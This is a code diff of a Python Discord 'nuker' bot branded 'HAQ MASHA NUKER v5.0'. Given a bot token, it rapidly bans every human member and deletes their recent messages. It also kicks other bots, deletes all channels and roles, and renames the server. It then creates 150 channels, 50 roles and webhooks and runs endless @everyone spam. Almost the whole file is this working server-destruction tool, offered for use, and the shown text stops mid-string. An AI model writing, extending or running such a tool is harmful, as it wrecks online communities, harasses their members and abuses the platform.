@@ -3,242 +3,280 @@ from discord.ext import commands
 import asyncio
 import os
 import random
-from colorama import init, Fore, Style
 import time
+import aiohttp
 
-init(autoreset=True)
-
-# تنظيف الشاشة
 os.system('cls' if os.name == 'nt' else 'clear')
 
-# واجهة البداية
-print(Fore.RED + """
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║         ██╗  ██╗ █████╗ ██████╗                             ║
-║         ██║  ██║██╔══██╗██╔══██╗                            ║
-║         ███████║███████║██████╔╝                            ║
-║         ██╔══██║██╔══██║██╔══██╗                            ║
-║         ██║  ██║██║  ██║██║  ██║                            ║
-║         ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                            ║
-║                                                              ║
-║          الكتيبة هاق مشا تيم - NUKER ULTIMATE               ║
-║                                                              ║
-║              [ VON KATIBA JAK LMOT RA7 TARJ3 LOT ]         ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-""" + Style.RESET_ALL)
+print("""
+╔═══════════════════════════════════════════════════════════════════════╗
+║                                                                       ║
+║              ██╗  ██╗ █████╗  ██████╗                                ║
+║              ██║  ██║██╔══██╗██╔═══██╗                               ║
+║              ███████║███████║██║   ██║                               ║
+║              ██╔══██║██╔══██║██║▄▄ ██║                               ║
+║              ██║  ██║██║  ██║╚██████╔╝                               ║
+║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝                                ║
+║                                                                       ║
+║                    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗        ║
+║                    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗       ║
+║                    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝       ║
+║                    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗       ║
+║                    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║       ║
+║                    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ║
+║                                                                       ║
+║                         HAQ MASHA NUKER v5.0                          ║
+║                           MAXIMUM DESTRUCTION                         ║
+║                                                                       ║
+╚═══════════════════════════════════════════════════════════════════════╝
+""")
 
-# طلب التوكن
-token = input(Fore.YELLOW + "[?] ادخل توكن البوت: " + Fore.CYAN)
-print(Fore.GREEN + "\n[✓] جاري الاتصال بديسكورد..." + Style.RESET_ALL)
+token = input("[?] ENTER BOT TOKEN > ")
 
-# إعدادات البوت
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# رسالة الطرد
-KICK_MESSAGE = """
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║              VON KATIBA JAK LMOT RA7 TARJ3 LOT              ║
-║                                                              ║
-║                    HHHH HHHH HHHH HHHH                      ║
-║                                                              ║
-║              ████████╗███████╗ █████╗ ███╗   ███╗           ║
-║              ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║           ║
-║                 ██║   █████╗  ███████║██╔████╔██║           ║
-║                 ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║           ║
-║                 ██║   ███████╗██║  ██║██║ ╚═╝ ██║           ║
-║                 ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝           ║
-║                                                              ║
-║              الكتيبة هاق مشا تيم تخلص عليكم                 ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
+# HAQ MASHA KICK/BAN MESSAGE
+HAQ_MESSAGE = """
+╔═══════════════════════════════════════════════════════════════════════╗
+║                                                                       ║
+║                          ██╗  ██╗ █████╗  ██████╗                     ║
+║                          ██║  ██║██╔══██╗██╔═══██╗                    ║
+║                          ███████║███████║██║   ██║                    ║
+║                          ██╔══██║██╔══██║██║▄▄ ██║                    ║
+║                          ██║  ██║██║  ██║╚██████╔╝                    ║
+║                          ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝                     ║
+║                                                                       ║
+║                          ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗   ║
+║                          ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗  ║
+║                          ██╔████╔██║███████║███████╗███████║███████║  ║
+║                          ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║  ║
+║                          ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║  ║
+║                          ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝  ║
+║                                                                       ║
+║                                                                       ║
+║                    YOU HAVE BEEN TERMINATED BY                        ║
+║                         HAQ MASHA TEAM                                ║
+║                                                                       ║
+║                    https://discord.gg/c7cgYk4V                        ║
+║                                                                       ║
+╚═══════════════════════════════════════════════════════════════════════╝
 """
 
-# قائمة رسائل السبام
-spam_messages = [
-    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
-    "```الكتيبة هاق مشا تيم```",
-    "@everyone **تم اختراق السيرفر بالكامل**",
-    "```SERVER DESTROYED BY HAQ MASHA TEAM```",
-    "**VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
-    "@everyone **راجعوا حساباتكم محد رح يساعدكم**",
-    "```BYE BYE SERVER```",
-    "**😂😂😂😂😂 يا خسارة فيكم**"
+# SPAM MESSAGES
+SPAM_LIST = [
+    "@everyone **HAQ MASHA TEAM DESTROYED THIS SERVER**",
+    "```HAQ MASHA NUKER ACTIVE```",
+    "@everyone **https://discord.gg/c7cgYk4V**",
+    "```SERVER = DELETED```",
+    "**HAQ MASHA SAYS: GAME OVER**",
+    "@everyone **YOUR SERVER IS GONE FOREVER**",
+    "```THANKS FOR PLAYING```",
+    "**HAQ MASHA TEAM - MAXIMUM DESTRUCTION**"
 ]
 
-# أسماء الرتب الجديدة
-rank_names = ["VON", "KATIBA", "JAK", "LMOT", "RA7", "TARJ3", "LOT", "HHHH", "HAQ", "MASHA", "TEAM", "NUKER"]
+# ROLE NAMES
+ROLE_NAMES = ["HAQ", "MASHA", "NUKE", "DESTROYER", "DELETED", "GONE", "REKT", "OWNER", "ADMIN", "HAQ-MASHA"]
+
+# WEBHOOK SPAM NAMES
+WEBHOOK_NAMES = ["HAQ-MASHA", "NUKER", "DESTROYER", "SYSTEM", "ADMIN", "HACKER"]
 
 @bot.event
 async def on_ready():
-    print(Fore.GREEN + f"\n[✓] تم تشغيل البوت: {bot.user.name}#{bot.user.discriminator}")
-    print(Fore.YELLOW + f"[✓] معرف البوت: {bot.user.id}")
-    print(Fore.RED + "\n[⚠] سيبدأ النوكر بعد 3 ثواني...\n" + Style.RESET_ALL)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(f"""
+╔═══════════════════════════════════════════════════════════════════════╗
+║                                                                       ║
+║              ✓ BOT ONLINE: {bot.user.name}
+║              ✓ BOT ID: {bot.user.id}
+║              ✓ SERVERS: {len(bot.guilds)}
+║                                                                       ║
+║              TYPE 'v' OR 'b' IN ANY CHANNEL TO START                 ║
+║              MAXIMUM DESTRUCTION MODE ACTIVATED                       ║
+║                                                                       ║
+╚═══════════════════════════════════════════════════════════════════════╝
+    """)
+
+@bot.command(name="v")
+async def nuke_v(ctx):
+    await maximum_nuke(ctx)
+
+@bot.command(name="b")
+async def nuke_b(ctx):
+    await maximum_nuke(ctx)
+
+async def maximum_nuke(ctx):
+    guild = ctx.guild
+    start_time = time.time()
     
-    await asyncio.sleep(3)
+    # Send initial message
+    await ctx.send("```🔥 HAQ MASHA MAXIMUM NUKE INITIATED 🔥```")
     
-    # تخريب جميع السيرفرات التي فيها البوت
-    for guild in bot.guilds:
-        print(Fore.MAGENTA + f"\n{'='*60}")
-        print(f"[*] جاري تخريب السيرفر: {guild.name} ({guild.id})")
-        print(f"{'='*60}" + Style.RESET_ALL)
-        
-        # ============================================
-        # المرحلة 1: طرد جميع الأعضاء بسرعة فائقة
-        # ============================================
-        print(Fore.RED + "\n[!!!] المرحلة 1: بدء طرد جميع الأعضاء بسرعة فائقة..." + Style.RESET_ALL)
-        
-        members = await guild.fetch_members(limit=None).flatten()
-        total_members = len([m for m in members if not m.bot and m.id != guild.owner_id])
-        kicked_count = 0
-        
-        start_time = time.time()
-        
-        # طرد جميع الأعضاء (ما عدا البوت والأونور)
-        for member in members:
-            if not member.bot and member.id != guild.owner_id:
-                try:
-                    # إرسال رسالة خاصة للعضو قبل الطرد
-                    try:
-                        await member.send(KICK_MESSAGE)
-                    except:
-                        pass
-                    
-                    # طرد العضو
-                    await member.kick(reason="VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH")
-                    kicked_count += 1
-                    
-                    # عرض التقدم كل 5 أعضاء
-                    if kicked_count % 5 == 0:
-                        print(Fore.CYAN + f"    [✓] تم طرد {kicked_count}/{total_members} عضو" + Style.RESET_ALL)
-                    
-                    # تأخير بسيط جداً لتجنب الـ Rate Limit
-                    await asyncio.sleep(0.1)
-                    
-                except Exception as e:
-                    print(Fore.RED + f"    [✗] فشل طرد {member.name}: {str(e)[:50]}" + Style.RESET_ALL)
-        
-        end_time = time.time()
-        time_taken = round(end_time - start_time, 2)
-        
-        print(Fore.GREEN + f"\n[✓] اكتمل طرد الأعضاء: تم طرد {kicked_count} عضو خلال {time_taken} ثانية" + Style.RESET_ALL)
-        
-        # ============================================
-        # المرحلة 2: إرسال رسائل السبام للأعضاء المتبقين
-        # ============================================
-        print(Fore.YELLOW + "\n[!!!] المرحلة 2: بدء إرسال رسائل السبام..." + Style.RESET_ALL)
-        
-        # إرسال رسالة للقناة النظامية إن وجدت
-        for channel in guild.text_channels:
+    print(f"\n[!] HAQ MASHA NUKE STARTED ON: {guild.name} | ID: {guild.id}")
+    
+    # ============================================
+    # PHASE 1: BAN ALL MEMBERS FIRST (PRIORITY)
+    # ============================================
+    await ctx.send("**🔨 PHASE 1: BANNING ALL MEMBERS (PRIORITY MODE)**")
+    
+    members = await guild.fetch_members(limit=None).flatten()
+    total_humans = len([m for m in members if not m.bot])
+    banned = 0
+    
+    for member in members:
+        if not member.bot:
             try:
-                await channel.send(KICK_MESSAGE)
-                await channel.send("@everyone **" + KICK_MESSAGE[:100] + "**")
+                # Send HAQ MASHA message first
+                try:
+                    await member.send(HAQ_MESSAGE)
+                except:
+                    pass
+                
+                # BAN (not kick - BAN is stronger)
+                await member.ban(reason="HAQ MASHA TEAM", delete_message_days=7)
+                banned += 1
+                
+                if banned % 5 == 0:
+                    await ctx.send(f"**BANNED {banned}/{total_humans} MEMBERS**")
+                
+                await asyncio.sleep(0.05)  # Super fast
             except:
                 pass
-        
-        # ============================================
-        # المرحلة 3: التخريب الكامل للسيرفر
-        # ============================================
-        print(Fore.RED + "\n[!!!] المرحلة 3: بدء التخريب الكامل للسيرفر..." + Style.RESET_ALL)
-        
-        # 1. تغيير اسم السيرفر
-        try:
-            await guild.edit(name="VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH")
-            print(Fore.GREEN + "[✓] تم تغيير اسم السيرفر" + Style.RESET_ALL)
-        except:
-            print(Fore.RED + "[✗] فشل تغيير اسم السيرفر" + Style.RESET_ALL)
-        
-        # 2. حذف جميع الرومات بسرعة
-        print(Fore.YELLOW + "[*] جاري حذف جميع الرومات..." + Style.RESET_ALL)
-        for channel in guild.channels:
+    
+    await ctx.send(f"**✅ BANNED {banned} MEMBERS SUCCESSFULLY**")
+    
+    # ============================================
+    # PHASE 2: KICK ALL BOTS
+    # ============================================
+    await ctx.send("**🤖 PHASE 2: REMOVING ALL BOTS**")
+    
+    bots_kicked = 0
+    for member in members:
+        if member.bot and member.id != bot.user.id:
             try:
-                await channel.delete(reason="NUKER")
-                print(Fore.CYAN + f"    [✓] تم حذف: {channel.name}" + Style.RESET_ALL)
+                await member.kick(reason="HAQ MASHA")
+                bots_kicked += 1
                 await asyncio.sleep(0.05)
             except:
                 pass
-        
-        # 3. حذف جميع الرتب
-        print(Fore.YELLOW + "[*] جاري حذف جميع الرتب..." + Style.RESET_ALL)
-        for role in guild.roles:
-            if role.name != "@everyone":
+    
+    await ctx.send(f"**✅ REMOVED {bots_kicked} BOTS**")
+    
+    # ============================================
+    # PHASE 3: DELETE EVERY CHANNEL
+    # ============================================
+    await ctx.send("**🗑️ PHASE 3: DELETING ALL CHANNELS**")
+    
+    channels_deleted = 0
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="HAQ MASHA")
+            channels_deleted += 1
+            await asyncio.sleep(0.03)
+        except:
+            pass
+    
+    await ctx.send(f"**✅ DELETED {channels_deleted} CHANNELS**")
+    
+    # ============================================
+    # PHASE 4: DELETE EVERY ROLE
+    # ============================================
+    await ctx.send("**🎭 PHASE 4: DELETING ALL ROLES**")
+    
+    roles_deleted = 0
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete(reason="HAQ MASHA")
+                roles_deleted += 1
+                await asyncio.sleep(0.03)
+            except:
+                pass
+    
+    await ctx.send(f"**✅ DELETED {roles_deleted} ROLES**")
+    
+    # ============================================
+    # PHASE 5: CHANGE GUILD NAME
+    # ============================================
+    new_name = random.choice(["HAQ-MASHA", "NUKE", "DESTROYED", "DELETED", "h4q", "m4sh4"])
+    try:
+        await guild.edit(name=new_name)
+        await ctx.send(f"**✅ SERVER RENAMED TO: {new_name}**")
+    except:
+        pass
+    
+    # ============================================
+    # PHASE 6: CREATE MASS CHANNELS (150+)
+    # ============================================
+    await ctx.send("**📁 PHASE 6: CREATING 150 CHANNELS**")
+    
+    for i in range(150):
+        try:
+            await guild.create_text_channel(name=f"haq-masha-{i}")
+            if i % 25 == 0:
+                await ctx.send(f"**CREATED {i} CHANNELS...**")
+            await asyncio.sleep(0.02)
+        except:
+            pass
+    
+    # ============================================
+    # PHASE 7: CREATE WEBHOOKS FOR EXTRA SPAM
+    # ============================================
+    await ctx.send("**🪝 PHASE 7: CREATING WEBHOOKS**")
+    
+    webhooks = []
+    for channel in guild.text_channels:
+        try:
+            webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
+            webhooks.append(webhook)
+            await asyncio.sleep(0.05)
+        except:
+            pass
+    
+    # ============================================
+    # PHASE 8: ROLE SPAM
+    # ============================================
+    await ctx.send("**🎭 PHASE 8: CREATING 50 ROLES**")
+    
+    for i in range(50):
+        try:
+            await guild.create_role(name=f"{random.choice(ROLE_NAMES)}-{i}", color=discord.Color.red())
+            await asyncio.sleep(0.02)
+        except:
+            pass
+    
+    # ============================================
+    # PHASE 9: INFINITE SPAM (CHANNELS + WEBHOOKS)
+    # ============================================
+    await ctx.send("**💬 PHASE 9: STARTING INFINITE SPAM**")
+    
+    async def channel_spam():
+        while True:
+            for channel in guild.text_channels:
                 try:
-                    await role.delete(reason="NUKER")
-                    print(Fore.CYAN + f"    [✓] تم حذف رتبة: {role.name}" + Style.RESET_ALL)
+                    await channel.send(random.choice(SPAM_LIST))
                     await asyncio.sleep(0.05)
                 except:
                     pass
-        
-        # 4. إنشاء 100 روم جديد بسرعة
-        print(Fore.YELLOW + "[*] جاري إنشاء 100 روم جديد..." + Style.RESET_ALL)
-        for i in range(100):
-            try:
-                await guild.create_text_channel(name=f"VON-KATIBA-{i}")
-                if i % 20 == 0:
-                    print(Fore.CYAN + f"    [✓] تم إنشاء {i} روم..." + Style.RESET_ALL)
-                await asyncio.sleep(0.05)
-            except:
-                pass
-        
-        # 5. إنشاء رتب جديدة
-        print(Fore.YELLOW + "[*] جاري إنشاء رتب جديدة..." + Style.RESET_ALL)
-        for rank in rank_names:
-            try:
-                await guild.create_role(name=rank, color=discord.Color.red())
-                print(Fore.CYAN + f"    [✓] تم إنشاء رتبة: {rank}" + Style.RESET_ALL)
-                await asyncio.sleep(0.05)
-            except:
-                pass
-        
-        # 6. حظر الأعضاء المتبقين
-        print(Fore.YELLOW + "[*] جاري حظر الأعضاء المتبقين..." + Style.RESET_ALL)
-        remaining_members = await guild.fetch_members(limit=None).flatten()
-        for member in remaining_members:
-            if not member.bot:
+            await asyncio.sleep(0.3)
+    
+    async def webhook_spam():
+        while True:
+            for webhook in webhooks:
                 try:
-                    await member.ban(reason="VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH")
+                    await webhook.send(random.choice(SPAM_LIST), username=random.choice(WEBHOOK_NAMES))
+                    await asyncio.sleep(0.05)
                 except:
                     pass
-        
-        # 7. بدء السبام المستمر في جميع الرومات الجديدة
-        print(Fore.YELLOW + "[*] بدء إرسال السبام المستمر..." + Style.RESET_ALL)
-        
-        async def spam_all_channels():
-            while True:
-                for channel in guild.text_channels:
-                    try:
-                        msg = random.choice(spam_messages)
-                        await channel.send(msg)
-                        await asyncio.sleep(0.1)
-                    except:
-                        pass
-                await asyncio.sleep(0.5)
-        
-        # تشغيل السبام في الخلفية
-        asyncio.create_task(spam_all_channels())
-        
-        print(Fore.GREEN + f"""
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   ✓✓✓ اكتمل التخريب بنجاح ✓✓✓                              ║
-║                                                              ║
-║   - تم طرد {kicked_count} عضو                              ║
-║   - تم حذف جميع الرومات والرتب                              ║
-║   - تم إنشاء 100 روم جديد                                   ║
-║   - بدأ السبام المستمر                                      ║
-║                                                              ║
-║   VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                   ║
-║                                                              ║
-║   الكتيبة هاق مشا تيم                                       ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-""" + Style.RESET_ALL)
-        
-        # استمرار البوت للتخريب
-        await asyncio.sleep(3600)  # البوت يبقى شغال ساعة كاملة
-
-# تشغيل البوت
-bot.run(token)
+            await asyncio.sleep(0.3)
+    
+    asyncio.create_task(channel_spam())
+    asyncio.create_task(webhook_spam())
+    
+    # ============================================
+    # PHASE 10: FINAL MESSAGE & STATS
+    # ============================================
+    end_time = time.time()
+    total_time = round(end_time - start_time, 2)
+    
+    final_message = f"""
